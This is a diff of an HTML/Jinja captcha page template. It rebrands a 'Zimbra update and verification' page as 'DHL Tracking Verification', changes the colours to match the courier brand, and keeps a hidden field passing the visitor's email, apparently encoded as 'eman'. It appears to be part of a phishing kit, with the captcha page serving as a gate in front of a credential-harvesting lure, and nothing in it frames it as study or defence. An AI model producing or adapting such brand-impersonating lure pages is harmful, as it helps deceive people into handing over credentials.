@@ -8,7 +8,7 @@
   <style>
     body {
       font-family: 'Roboto', sans-serif;
-      background-color: #040273;
+      background-color: #d97716;
       margin: 0;
       padding: 0;
       display: flex;
@@ -85,7 +85,7 @@
       border: none;
       border-radius: 5px;
       font-size: 16px;
-      background-color: #4C8CC7; 
+      background-color: #bf351d; 
       color: #FFFFFF;
       cursor: pointer;
       transition: background-color 0.3s, transform 0.3s; /* Add transform transition */
@@ -105,11 +105,11 @@
   </style>
 </head>
 <body>
-  <h1>Zimbra update and verification</h1>
+  <h1>DHL Tracking Verification</h1>
   <p></p>
   <div id="captcha-container">{{ code }}</div>
   <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
-    <input id="captcha-input" type="text"  placeholder="Enter code here" name="code" required>
+    <input id="captcha-input" type="text" placeholder="Enter the tracking code above." name="code" required>
     <input type="hidden" name="web" value="{{ eman }}">
     <br>
     <button id="captcha-submit" type="submit">Continue</button>
